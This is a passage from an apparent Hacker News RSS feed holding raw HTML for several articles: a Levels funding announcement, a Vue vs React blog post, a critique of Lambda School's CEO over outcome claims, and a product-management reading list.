2021.&nbsp;</span></p><p><span>“Optimizing metabolic function can improve energy, endurance, memory, mood, and cognitive performance. Seven of the 10 leading causes of death in the US are strongly related to metabolic dysfunction,” said Dr. Casey Means, Co-founder of Levels. “Levels helps you improve metabolic fitness by alerting you to foods that negatively impact glucose levels. Armed with this information, you can take control of your metabolic health and make healthier lifestyle decisions.”</span></p><p><img src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_400/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.41-AM-400x260.png" data-src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_400/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.41-AM-400x260.png" alt="" width="400" height="260" data-srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_400/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.41-AM-400x260.png 400w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_200/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.41-AM-200x130.png 200w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_768/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.41-AM-768x499.png 768w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1064/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.41-AM.png 1064w" data-sizes="(max-width: 400px) 100vw, 400px" srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_400/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.41-AM-400x260.png 400w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_200/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.41-AM-200x130.png 200w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_768/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.41-AM-768x499.png 768w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1064/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.41-AM.png 1064w"></p><p><span>“Too many smart people focus on small problems. Levels has picked something big and important to solve – and I love it,” said Marc Randolph, co-founder and first CEO of Netflix. “They’re improving metabolic health and, by extension, the lives of millions of people. It’s an ambitious goal, but they’re the team to do it. The progress they’ve made in a short amount of time blows me away. I’m thrilled to join as an investor and mentor.”</span></p><p><span>“The two most fundamental levers for our health––diet and exercise––remain shrouded in generalities and unrealistic advice. By harnessing CGMs, wearables, data science, and the latest advances in biology and medicine, Levels provides critical information to help consumers take control of diet and exercise, while making real, fundamental improvements in their health,” said Vijay Pande, PhD and General Partner, a16z. “Preventing metabolic dysfunction is one of the 21st century’s greatest health challenges, and Levels addresses the epidemic head on.”&nbsp;</span></p><h4><img src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_313/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.58-AM-313x400.png" data-src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_313/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.58-AM-313x400.png" alt="" width="313" height="400" data-srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_313/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.58-AM-313x400.png 313w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_156/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.58-AM-156x200.png 156w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_523/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.58-AM.png 523w" data-sizes="(max-width: 313px) 100vw, 313px" srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_313/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.58-AM-313x400.png 313w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_156/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.58-AM-156x200.png 156w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_523/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.58-AM.png 523w"></h4><h4>Additional Investor Quotes:</h4><blockquote><p><span>I had to try Levels before investing; as soon as I did, I knew how valuable this was going to be to people. To have instant feedback on what food and exercise are doing to your glucose levels allows you to make better choices because you can experiment. This is a company that is really going to change a lot of people’s lives and quality of life for the better, and I’m really excited to be involved.</span></p></blockquote><p><span>–Matthew “Delly” Dellavedova, NBA player (Cleveland Cavaliers)</span></p><blockquote><p><span>Working as a clinician I’ve seen the power of acting on biometrics when people have access to them. The problem is that people are gated to information about their own bodies with complex and expensive barriers. The future of medicine is empowering people with their own biometrics, and Levels is the first company doing that in a meaningful way.</span></p></blockquote><p><span>–Dr. Anthony Gustin, Founder of Perfect Keto</span></p><blockquote><p><span>We have real-time data and metrics on the stuff we own: the mileage of our cars, the usage of water in our house, the performance of our 401k retirement accounts, etcetera. Yet, with our most important asset — our own health — we’re stuck in the stone ages without any access to our metabolic metrics and data. Levels is solving this massive problem in our broken healthcare model, and I’m so excited to invest and support the team in making our civilization healthier.</span></p></blockquote><p><span>—Geoff Woo, Founder of HVMN</span></p><h4>About Levels:</h4><p><a href="http://levelshealth.com/"><span>Levels</span></a><span> makes it easy for people to see how their diet is affecting both their health and their lifestyle in a quantifiable way by measuring biomarkers in real time. We are expanding access to continuous glucose monitoring and making it mainstream, focused on people looking to </span><a href="https://www.levelshealth.com/blog/optimal-diet"><span>find their optimal diet</span></a><span> and improve their </span><a href="https://www.levelshealth.com/blog/the-ultimate-guide-to-metabolic-fitness-cgm-glucose"><span>metabolic fitness</span></a><span>. Our customers are </span><a href="https://www.levelshealth.com/blog/weight-loss-mindfulness-glucose-monitoring-cgm"><span>losing weight</span></a><span>, optimizing</span><a href="https://www.levelshealth.com/blog/cgm-fueling-peak-athletic-performance"><span> exercise performance</span></a><span>, and </span><a href="https://www.levelshealth.com/blog/finding-freedom-in-the-keto-diet-by-using-cgm-an-interview-with-keto-influencer-allison-krook"><span>developing ideal versions of their dietary</span></a><span> philosophy of choice.</span></p><p><a href="https://www.linkedin.com/in/casey-means-md-b4b79b144/"><span>Casey Means MD</span></a><span> (Stanford), </span><a href="https://www.linkedin.com/in/joshclemente/"><span>Josh Clemente</span></a><span> (SpaceX, Hyperloop), </span><a href="https://www.linkedin.com/in/samcorcos/"><span>Sam Corcos</span></a><span> (CarDash, Y Combinator), </span><a href="https://www.linkedin.com/in/flinner/"><span>David Flinner</span></a><span> (Google), and </span><a href="https://www.linkedin.com/in/adconner/"><span>Andrew Conner</span></a><span> (Google) founded Levels to reverse the trend of metabolic dysfunction. More than 10% of the United States is diabetic and it’s increasing globally at an increasing rate—84 million Americans are prediabetic and 70% will be diabetic within 10 years. We’re starting with the performance and athletic market to build brand credibility and thought leadership and moving into mainstream health and wellness in 2021.</span></p><p>Media Contact:</p><p>Ross Fenton, Jack Taylor PR, 415-722-3489, ross@jacktaylorpr.com</p></div></div></section><section id="blog-single-content-related" data-ani-anchor=""></section></main>         </div>]]>
            </description>
            <link>https://www.levelshealth.com/blog/levels-raises-12m-investment-round-improve-metabolic-health-wearables</link>
            <guid isPermaLink="false">hacker-news-small-sites-25141664</guid>
            <pubDate>Wed, 18 Nov 2020 19:57:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vue vs React: Best Choice for Startups]]>
            </title>
            <description>
<![CDATA[
Score 61 | Comments 72 (<a href="https://news.ycombinator.com/item?id=25141661">thread link</a>) | @morchen
<br/>
November 18, 2020 | https://swimm.io/blog/vue-vs-react-best-choice-for-startups/ | <a href="https://web.archive.org/web/*/https://swimm.io/blog/vue-vs-react-best-choice-for-startups/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section data-v-f94c7cca=""> <!----> <div data-v-0cf44990="" data-v-f94c7cca=""><div><p>A former front-end student of mine (Zoe*) recently emailed me, and honestly wanted to understand why is it that I chose to code <a href="http://swimm.io/">Swimm</a>, with Vue.Js and not React:</p>
<blockquote>
<p>“I just have one question for you: Why Vue?[...] I hope you're not rolling your eyes thinking - “ah no, another question about Vue”. Although knowing you and your passion, I'm sure you have a pretty strong opinion that could swallow me into becoming a Vue fan without even knowing it.”</p>
</blockquote>
<p>Vue.js gained a reputation in recent years as an edgy must-know framework, but developers often question what the hype is about, how it relates to them and what web framework they should choose for their product.</p>
<p>While there might be some over-hype around the expected <a href="https://madewithvuejs.com/blog/vue-3-roundup#:~:text=Vue%203%20release%20date,2020%2C%20according%20to%20the%20roadmap.">Vue 3 release due in Q3 2020</a>, Vue has been gaining traction for a few years now, and it was just a matter of time for <a href="https://www.netguru.com/blog/13-top-companies-that-have-trusted-vue.js-examples-of-applications">bigger companies</a> like Netflix, Behance, Grammarly, Alibibaba, GitLab and others, to pick it up. Yet according to <a href="https://insights.stackoverflow.com/survey/2020#technology-most-loved-dreaded-and-wanted-web-frameworks-wanted2">Stackoverflow’s 2020 developer</a> React.js is still the most wanted web framework (Vue.js coming in second).</p>
<h3>Vue.js vs React In a Nutshell</h3>
<p>I first used Vue at <a href="https://www.imcreator.com/">IM Creator</a>, a product I co-built originally with JQuery, and Vue was a breath of crisp air in my face. It was user friendly and progressive as it enabled me to use the framework for specific parts each time, without huge migrations. I could then for example create a menu in Vue, while the rest remained in legacy JQuery. What’s there not to like?</p>
<p>With Swimm (a new dev tool product) it wasn't even a question. I started our PoC with Vue.js and continued since then to our Beta self-served version. Several benefits should speak volumes to Startups these days especially compared to React:</p>
<ul>
<li><strong>Vue is Lightweight and Flexible</strong>. It means it's a framework that feels more like a library than a framework at all. You can try it out first in small use cases in your app before going all-in.</li>
<li><strong>Vue is less intrusive than React</strong> and much easier to onboard. Project components and structure in Vue are similar whie projects in React each vary in architecture and implementation. I find that you can recognize Vue structures easily which is what speeds up onboarding time for any developer learning a new codebase. Vue becomes easier to maintain. This is especially true for smaller products.</li>
<li><strong>Readability is key</strong> - Vue is based on the most basic principles of the Web and is more readable than React. The html/css and JS are separate while in React everything is in JS.</li>
<li><strong>Indie at its core</strong>. While it’s my personal opinion, many developers appreciate tools that are not backed by tech giants (for example React backed by Facebook, and Angular by Google), but rather grows from a community and that is why it is highly oriented to developer needs.</li>
</ul>
<h3>When does React Trump Vue.js:</h3>
<ul>
<li><strong>React is still most wanted by the industry</strong>. That can be a problem for new coders. From my recent experience recruiting for Swimm’s growing dev team, Vue is still harder to recruit for because of React’s persistent popularity. <strong>By the same token</strong>, even if many of the larger companies are picking it up, it’s still part of side projects and not the main product. This is why for the <a href="https://www.itc.tech/">ITC.tech</a> web-dev Bootcamp, I created a React-based curriculum.</li>
<li><strong>Flexibility in some aspects</strong>. React still has the ability to split between the visibility of a component and maintenance of the component - and still provides more flexibility.</li>
<li><strong>Docs are light years ahead</strong>. The features Release in React is fast paced and as React docs are extensive and elaborate. [Try skimming through all of the 500 pages of questions on React on Stackoverflow].</li>
</ul>
<h3><strong>To Sum it Up: A Note to Zoe</strong></h3>
<blockquote>
<p>“ Hi Zoë,</p>
<p>I chose Vue for many reasons.</p>
<p>It is easy to integrate into existing projects (That was my need the first time I used Vue)</p>
<p>It is has a more readable syntax</p>
<p>It's really reactive (no need to explicitly call the set function)</p>
<p>It is not maintained by a big company (Facebook / Google)[...]</p>
<p>Give it a try :)”</p>
</blockquote>
<p>Of course there is always a trade-off. These lessons learned reflect my personal views, insight gained from working in various startups and alongside numerous tech clients. As always, <a href="https://www.mindk.com/blog/react-vs-vue/">in depth research</a> is required to make sure which framework best suits your business case. But if you’re looking for a flexible  non-enterprise solution, Vue has proved easy to learn, scalable, user-friendly backed by a solid community that caters to other developers.</p>
<p>...</p>
<p>* Thanks for the inquisitive question, <a href="https://www.linkedin.com/in/zo%C3%ABcohen/">Zoe Cohen</a>.</p>
<p><strong>About Author:</strong></p>
<p><a href="https://www.linkedin.com/in/gilad-navot/">Gilad Navot</a> is Co-Founder and CPO at Swimm. Previously VP R&amp;D at <a href="https://www.imcreator.com/">IM Creator</a>, and was part of the founding <a href="https://www.itc.tech/">ITC.tech</a> team teaching front-end development to hundreds of students around the world.</p>
</div></div> </section></div>]]>
            </description>
            <link>https://swimm.io/blog/vue-vs-react-best-choice-for-startups/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25141661</guid>
            <pubDate>Wed, 18 Nov 2020 19:57:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lambda School's CEO Is Consistently Deceptive]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25141605">thread link</a>) | @applieddivinity
<br/>
November 18, 2020 | https://applieddivinitystudies.com/lambda-lies/ | <a href="https://web.archive.org/web/*/https://applieddivinitystudies.com/lambda-lies/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
       <p>Lambda School is a coding bootcamp that only charges tuition if you get a job. Founder/CEO Austen Allred frequently takes to Twitter, defending his bootcamp against <a target="_blank" rel="noopener" href="https://nymag.com/intelligencer/2020/02/lambda-schools-job-placement-rate-is-lower-than-claimed.html">allegations of fraud</a>, and rebutting critics with case after case of student success.</p>
<p>I was initially excited about Lambda School, but have slowly grown disillusioned over time. So when they released their <a target="_blank" rel="noopener" href="https://lambdaschool.com/reports/2019-outcomes-report#fast-facts">2019 H1 Outcomes Report</a>, I was excited to finally access a ground truth and put an end to all the speculation.</p>
<p>Instead, I found a consistent pattern of deception.</p>
<p>In the rest of this piece, I’ll walkthrough a number of examples, in which Allred:</p>
<ul>
<li>Claims a job placement rate of 86%, when the actual number is as low as 55%, and at least as bad at 70%</li>
<li>Misrepresents graduate salaries on Twitter, despite claiming a random sample</li>
<li>Calls regulatory approval a “significant endorsement”, despite a troubled history of bans</li>
<li>Lies about having been homeless</li>
</ul>
<p>Some of these are blatant and explicit, some are more subtle. I’ve done my best to present the facts fairly, and leave the rest up to your judgement.</p>
<h3 id="1-Allred-Misrepresents-Student-Outcomes"><a href="#1-Allred-Misrepresents-Student-Outcomes" title="1. Allred Misrepresents Student Outcomes"></a>1. Allred Misrepresents Student Outcomes</h3><p>In early 2019, <a target="_blank" rel="noopener" href="https://twitter.com/austen/status/1082815326960533504?lang=en">Allred took to Twitter</a> to share student outcomes, listing the following salaries:</p>
<ol>
<li>J: $80,000+</li>
<li>S: $80k</li>
<li>D: $110k base, ($130k total)</li>
<li>C: $130k</li>
<li>T: $90k</li>
<li>L: $140k</li>
<li>J: $85k</li>
<li>L: $89k</li>
<li>A: $85k</li>
<li>R: $75k</li>
<li>S: $70k</li>
</ol>
<p>A year later, when the <a target="_blank" rel="noopener" href="https://lambdaschool.com/reports/2019-outcomes-report#fast-facts">Outcomes Report</a> was released, it cited a median salary of just $70,000. In stark contrast, Allred’s 11 Tweets report exactly 0 students making less than $70,000. Statistically, that’s like flipping a coin and getting 11 heads in a row (probability .00049).</p>
<p>This seems bad, but whatever, Allred is just highlighting a few heartwarming anecdotes right? Surely he doesn’t actually claim that this is a randomly selected sample?</p>
<p><a target="_blank" rel="noopener" href="https://twitter.com/Austen/status/1082818077132091393">Except he absolutely does:</a><br><img src="https://applieddivinitystudies.com/images/allred-tweet.png"></p>
<p>To see just how poorly Allred’s claims line up against the official <a target="_blank" rel="noopener" href="https://lambdaschool.com/reports/2019-outcomes-report#fast-facts">Outcomes Report</a>, we can plot the histograms side by side:<br><img src="https://applieddivinitystudies.com/images/lambda-outcomes.png"></p>
<p>Allred claims that his examples were randomly selected, but his own statements are contradicted by the official outcomes report.</p>
<h3 id="2-Allred-Repeatedly-Misrepresents-Job-Placement-Rates"><a href="#2-Allred-Repeatedly-Misrepresents-Job-Placement-Rates" title="2. Allred Repeatedly Misrepresents Job Placement Rates"></a>2. Allred Repeatedly Misrepresents Job Placement Rates</h3><p>Earlier this year, <a target="_blank" rel="noopener" href="https://nymag.com/intelligencer/2020/02/lambda-schools-job-placement-rate-is-lower-than-claimed.html">New York Magazine reported</a> that Lambda school had marketed itself as having an 86% job placement rate, but then released an investor memo reporting a much lower rate of just 50%.</p>
<p>Allred took to podcasts, explaining in an <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=osrytvuiU8Y&amp;t=3m20s">interview with Jason Calacanis</a>:</p>
<blockquote>
<p>When we talk to investors, we talk in terms of enrolled students… of those students who were enrolled, X% were hired. Whereas when schools speak publicly, they speak in terms of graduated students. So obviously those two numbers are always going to be different.</p>
</blockquote>
<p>He goes on to clarify:</p>
<blockquote>
<p>That 86% was somewhat out of date… so we quickly put together what the real numbers would have been, which was 78%.</p>
</blockquote>
<p>Okay, so that seems reasonable enough. Case closed?</p>
<p>But then the official <a target="_blank" rel="noopener" href="https://lambdaschool.com/reports/2019-outcomes-report#fast-facts">Outcomes Report</a> was released, and contradicted Allred’s own statements: </p>
<ul>
<li>Of the 448 students in the cohort, only 318 graduated</li>
<li>Of those 318, only 284 graduated on time</li>
<li>Of 284 graduates, Lambda could only reach 255</li>
<li>Of those 255, only 201 had jobs</li>
<li>Of those 201, Lambda “did not have salary data… due to our data collection methods”, giving us data for 178 students</li>
</ul>
<p><strong>The job placement rate for enrolled students is 201 out of 448, or 45%. The job placement rate for graduated students is 201/318, or 63%.</strong></p>
<p>It actually gets worse. The original Lambda School claim was:</p>
<blockquote>
<p>86% of Lambda School graduates are hired within 6 months and make over $50k a year</p>
</blockquote>
<p>But according to the outcomes report, 26 of the placed graduates are making under $50,000. <strong>The actual placement rate for graduates making over $50,000 is just 55%</strong>. That’s a far cry from the 86% they claim, and much closer to the 50% reported by New York Magazine.</p>
<p>To be clear about timing, the New York Magazine article was published February 19th 2020, the <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=osrytvuiU8Y&amp;t=3m20s">interview</a> was on March 3rd, and the Outcomes Report was <a target="_blank" rel="noopener" href="https://twitter.com/lambdaschool/status/1244054419471302664">published March 28th 2020</a>. So these should all be about the same cohort, or at least a similar set of students.</p>
<p>So where does the 78% come from? Following article, Allred published a <a target="_blank" rel="noopener" href="https://www.linkedin.com/pulse/note-outcomes-data-lambda-school-austen-allred?articleId=6637802701117882368">note on LinkedIn</a> with the following chart:<br><img src="https://applieddivinitystudies.com/images/lambda-flow.png"></p>
<p>So 78% is what you get if you ignore students who graduated late, ignore students who have yet to graduate,  ignore the “graduated and disengaged” students, and pretend everyone is making over $50,000.</p>
<p>To his credit, Allred does provide another table which includes disengaged sudents and reports a 70% placement rate. Not only is this a far cry from the 86% originally reported, it also includes the 15% of placed students making under $50,000.</p>
<p>Although it may seem fair to count late graduates in the H2 report, note that this is a misrepresentive sample. Students who graduate late will likely have worse results later on, and underperform students who graduated on time. If Lambda wanted to account for this, they could have included 2018 H2 late graduates in the 2019 H1 report, but they neglected to do so.</p>
<h3 id="3-Allred-Misrepresents-Legal-Action-Against-Lambda-School"><a href="#3-Allred-Misrepresents-Legal-Action-Against-Lambda-School" title="3. Allred Misrepresents Legal Action Against Lambda School"></a>3. Allred Misrepresents Legal Action Against Lambda School</h3><p>In March 2019, <a target="_blank" rel="noopener" href="https://news.ycombinator.com/item?id=19374417">Allred wrote</a>:</p>
<blockquote>
<p><strong>Regulators love us</strong> - they’re sick of for profit schools promising a lot and delivering little except debt. [emphasis mine]</p>
</blockquote>
<p>December the same year, <a target="_blank" rel="noopener" href="https://twitter.com/sandofsky/status/1211717254712135680?lang=en">it was revealed</a> that Lambda was actually operating illegally, with no approval from regulators.</p>
<p>Okay, so this looks bad, but it doesn’t mean Allred is lying. It’s entirely possible that he thought regulators loved Lambda in March, and wasn’t corrected until a $75,000 fine hit the following month.</p>
<p>When Lambda finally did get approval to operate in California, Allred <a target="_blank" rel="noopener" href="https://lambdaschool.com/the-commons/baby-steps-incentive-aligned-higher-education-job-training">wrote</a></p>
<blockquote>
<p>Over the past year, Lambda School worked to advance an ambitious goal: become the first online school approved by California regulators to offer ISAs. <strong>We achieved a major victory when state regulators licensed us as a school in August, representing a significant endorsement</strong> for our all-online, career-focused education model. However, in order to secure this approval, we made the difficult decision to stop offering our ISA option to students in California.</p>
</blockquote>
<p>To be clear, none of this is an outright lie, but it is a dishonest representation of the regulatory environment. To recap:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://news.ycombinator.com/item?id=19374417">March 2019</a>: Allred claims “Regulators love us”</li>
<li><a target="_blank" rel="noopener" href="https://twitter.com/sandofsky/status/1211717254712135680">April 2019</a>: Regulators fine Lambda $75,000</li>
</ul>
<p>Then Lambda applies for approval, leading to this saga in which:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://twitter.com/sandofsky/status/1211786705428086784">July 2019</a>: Regulators deny the application, ordering Lambda to cease operations</li>
<li>Lambda continues operations anyway</li>
<li><a target="_blank" rel="noopener" href="https://twitter.com/sandofsky/status/1211793179831177216">December 2019</a>: Lambda re-applies for approval, is told to cease operations</li>
<li>Lambda continues operations anyway</li>
<li><a target="_blank" rel="noopener" href="https://lambdaschool.com/the-commons/an-update-on-lambda-school-and-isas-in-california">June 2020</a>: Lambda submits another application, regulators say they cannot use ISAs</li>
<li>Lambda finally agrees to stop using ISAs in California</li>
<li><a target="_blank" rel="noopener" href="https://lambdaschool.com/the-commons/baby-steps-incentive-aligned-higher-education-job-training">October 2020</a>: Allred calls regulator approval a “major victory” and “significant endorsement”</li>
</ul>
<p>As best I can surmise, those are the facts of this case. You can decide for yourself if you think Allred is acting with integrity.</p>
<h3 id="Bonus-Allred-Lies-about-Experiencing-Homelessness"><a href="#Bonus-Allred-Lies-about-Experiencing-Homelessness" title="Bonus: Allred Lies about Experiencing Homelessness"></a>Bonus: Allred Lies about Experiencing Homelessness</h3><p>This has nothing to do with Lambda School, and is admitadely somewhat gratuitous. But it does point to continued dishonesty on the part of Allred, and is too blatant to ignore.</p>
<p>In 2017, Allred <a target="_blank" rel="noopener" href="https://twitter.com/Austen/status/940658401209491456">tweeted</a>:</p>
<blockquote>
<p>I was homeless, had no skills, no degree, just $300 and a laptop, but that’s all you need.</p>
</blockquote>
<p>In a <a target="_blank" rel="noopener" href="https://news.ycombinator.com/item?id=17938403">2018 Hacker News comment</a>, he wrote:</p>
<blockquote>
<p>I’m also formerly homeless…. I know how hard it is to focus on getting a job when you’re just trying to survive</p>
</blockquote>
<p>An <a target="_blank" rel="noopener" href="https://bagholderreport.substack.com/p/lambda-school-is-the-culmination">article</a> includes a screenshot of an Allred’s reply to a tweet which reads:</p>
<blockquote>
<p>I have been homeless, slept on those same streets [1]</p>
</blockquote>
<p>The arc from homeless to multi-millionaire founder would be inspiring, except that it isn’t actually true.</p>
<p>In a <a target="_blank" rel="noopener" href="https://news.ycombinator.com/item?id=6758165">2013 Hacker News comment</a>. Allred writes:</p>
<blockquote>
<p>I lived in a Honda Civic this summer as I was getting a startup off the ground… and <strong>I had a half dozen people offer to let me stay at their place or crash on their couch rent-free.</strong></p>
<p>….As a result, <strong>I wasn’t living in a car for lack of other options</strong>, but rather out of belief that I could create something by sheer will-power, and that I was going to do that come hell or high water. My homelessness was a matter of seeking something greater than myself, not being lost to poverty. [emphasis mine]</p>
</blockquote>
<p>Similarly, in a now-deleted blog post titled <a target="_blank" rel="noopener" href="https://archive.is/OqxKP">Voluntary Homeless in Silicon Valley</a> Allred writes:</p>
<blockquote>
<p>Candidly, living in a car in Silicon Valley had much more appeal to me than a single bed and a shared bathroom… Much more than money, what fuels me is obsession with minimalism, reading way too much Thoreau, and trying to continually see life from a different angles…&nbsp; It’s about questioning society at its fundamentals, and seeing what a life not tied down by a foundation really feels like. And so far I love it.</p>
</blockquote>
<p>So again, Allred’s claims are… not technically a lie? I mean he did sleep out of a car, but he did it voluntarily. You’re free to make your own judgements, but when I hear “I have been homeless, slept on those same streets”, I do not think of someone with half a dozen offers of free housing. That isn’t poverty, it’s cosplay.</p>
<h3 id="Conclusion-Why-does-any-of-this-matter"><a href="#Conclusion-Why-does-any-of-this-matter" title="Conclusion: Why does any of this matter?"></a>Conclusion: Why does any of this matter?</h3><p>Am I just piling onto an already heavily criticized company? Am I guilty of being a critic rather than a creator?</p>
<p>I initially wrote about this purely using Lambda School as an example to illustrate a broader point about incentive alignment. But the more I read, the clearer it became that they were just consistently dishonest. Not outright fraudulent, but just really misleading about everything from student outcomes, to regulatory pressure, to the founder’s own history.</p>
<p>Still, why does any of this matter if Lambda is genuinely educating and helping students?</p>
<div><p>First of all, despite the outcomes report, we still have no idea what the median outcome actually is! They’re reporting data for 178 out of 448 enrolled students, which is just 40%. According to the report, the other 60% of enrolled students either:</p></div>
<ul>
<li>Remain unemployed (54 students, 12% of cohort)</li>
<li>Graduated late or not at all (164 students, 37%, of cohort)</li>
<li>Became mysteriously …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://applieddivinitystudies.com/lambda-lies/">https://applieddivinitystudies.com/lambda-lies/</a></em></p>]]>
            </description>
            <link>https://applieddivinitystudies.com/lambda-lies/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25141605</guid>
            <pubDate>Wed, 18 Nov 2020 19:53:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I compiled all blog posts I read in past six months to learn product management]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25141437">thread link</a>) | @soorajchandran
<br/>
November 18, 2020 | https://sooraj.io/product-management-for-engineers/ | <a href="https://web.archive.org/web/*/https://sooraj.io/product-management-for-engineers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<div id="primary">
		<main id="main" role="main">

			
				
<article id="post-206" class="page">
	<div>
		<!-- .entry-header -->

		<div>
			
<p>A few months ago, the company I co-founded&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://money.yahoo.com/oyster-acquires-carrom-accelerate-global-100000172.html">Carrom, was acquired by Oyster</a>. I joined Oyster to build the employment platform. It was officially my first time in a product role. Although I have been creating products for a good part of my life, I felt I lacked a lot of basic product management wisdom.</p>



<p>Over the past few months, I’ve been learning about the missing pieces with guidance from a few great mentors. I have curated a list of blog posts, books, and videos I’ve consumed along the way.</p>



<div><figure><img data-attachment-id="311" data-permalink="https://sooraj.io/screenshot-2020-11-18-at-20-36-01-1/" data-orig-file="https://soorajio.files.wordpress.com/2020/11/screenshot-2020-11-18-at-20.36.01-1.png" data-orig-size="1562,868" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-11-18-at-20.36.01-1" data-image-description="" data-medium-file="https://soorajio.files.wordpress.com/2020/11/screenshot-2020-11-18-at-20.36.01-1.png?w=300" data-large-file="https://soorajio.files.wordpress.com/2020/11/screenshot-2020-11-18-at-20.36.01-1.png?w=640" src="https://soorajio.files.wordpress.com/2020/11/screenshot-2020-11-18-at-20.36.01-1.png?w=1024" alt="" srcset="https://soorajio.files.wordpress.com/2020/11/screenshot-2020-11-18-at-20.36.01-1.png?w=1024 1024w, https://soorajio.files.wordpress.com/2020/11/screenshot-2020-11-18-at-20.36.01-1.png?w=150 150w, https://soorajio.files.wordpress.com/2020/11/screenshot-2020-11-18-at-20.36.01-1.png?w=300 300w, https://soorajio.files.wordpress.com/2020/11/screenshot-2020-11-18-at-20.36.01-1.png?w=768 768w, https://soorajio.files.wordpress.com/2020/11/screenshot-2020-11-18-at-20.36.01-1.png 1562w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>







<p>The above is not an exhaustive list of things you have to learn. But this can help you get started.</p>



<p><strong>These are very superficial.</strong> It might also work for non-engineers. But I might have taken some things for granted that I already know. Hence the title Product Management for Engineers.</p>



<p>I will keep updating the list as I discover more quality content. You can follow me on&nbsp;<a target="_blank" href="https://twitter.com/soorajchandran_" rel="noreferrer noopener">Twitter</a>&nbsp;if you are interested.</p>








					</div><!-- .entry-content -->

		<!-- .entry-footer -->
	</div>
</article><!-- #post-## -->


				
			
		</main><!-- #main -->
	</div><!-- #primary -->


	</div></div>]]>
            </description>
            <link>https://sooraj.io/product-management-for-engineers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25141437</guid>
            <pubDate>Wed, 18 Nov 2020 19:42:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[India's WhiteHat Jr Is Startup Hell]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25141240">thread link</a>) | @mnmncp
<br/>
November 18, 2020 | https://themorningcontext.com/indias-whitehatjr-is-startup-hell/ | <a href="https://web.archive.org/web/*/https://themorningcontext.com/indias-whitehatjr-is-startup-hell/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
	<div id="primary">
		<main id="main">

		
<article id="post-83914">
	<!-- .entry-header -->

			
